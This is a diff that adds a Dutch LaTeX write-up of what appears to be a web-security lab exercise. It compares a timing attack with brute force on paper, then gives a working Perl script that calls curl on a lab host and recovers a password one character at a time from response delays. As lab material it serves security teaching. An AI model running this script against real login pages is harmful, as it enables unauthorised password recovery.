@@ -1,0 +1,60 @@
+\begin{enumerate}
+\item Bij het manueel ingeven van letters zien we dat het ingeven van een foute letter ons 3-4 seconden laat wachten.
+\item Gewoon voor de fun even de wiskunde van een timing attack versus een brute force approach:
+\item Gegeven: wachtwoord van 10 tekens, foute invoer = 3 seconden wachten
+	\begin{enumerate}
+	\item Timing attack:
+		\begin{enumerate}
+		\item Slechtste geval: 3 seconden * 61 (a-zA-Z0-9) = 183 seconden per teken
+		\item 10 tekens = 1830 seconden = +/- half uur
+		\end{enumerate}
+	\item Brute force
+		\begin{enumerate}
+		\item Slechtste geval: 62\textsuperscript{10} = 839299365868340224 mogelijkheden
+		\item Eentje is juist: 839299365868340224 - 1 = 839299365868340223
+		\item 839299365868340223 * 3 seconden = 2517898097605020669 seconden =~ 80 miljard jaar
+		\end{enumerate}
+	\end{enumerate}
+\item Het oplossen van dit probleem doen we door middel van het schrijven van een script.
+\end{enumerate}
+
+\begin{lstlisting}
+Elk teken wordt doorlopen, telkens plakken we er de script-parameter aan toe.
+We meten de tijd, doen daarna ons request naar de site en meten de tijd opnieuw.
+Als het verschil kleiner is dan 3 seconden, dan hebben we de correcte letter gevonden en begint het script.
+
+Perl script:
+------------
+
+use Time::HiRes qw/ time sleep /;
+@abc = ("a".."z", "A".."Z", 0..9);
+foreach (@abc) {
+	$wachtwoord = $ARGV[0] . $_;
+	$start = time;
+	$res = `curl -s -k -d 'oplossing=$wachtwoord' https://192.168.255.130/oefeningen/oplossing/web-based/19/`;
+	$eind = time;
+	$verschil = $eind - $start;
+	
+	if ($verschil < 3) {
+		print "\n$wachtwoord\n";
+		exit 1;
+	}
+	
+	print ".";
+}
+
+Uitvoering: 
+-----------
+
+perl script.pl
+
+Het script geeft 'n' als resultaat. Daarna voeren we uit:
+	perl script.pl n
+	
+En krijgen we mogelijk 'ny' als resultaat. Daarna voeren we uit:
+	perl script.pl ny
+	
+...
+
+Uiteindelijk vinden we: nyL0csPv7P
+\end{lstlisting}
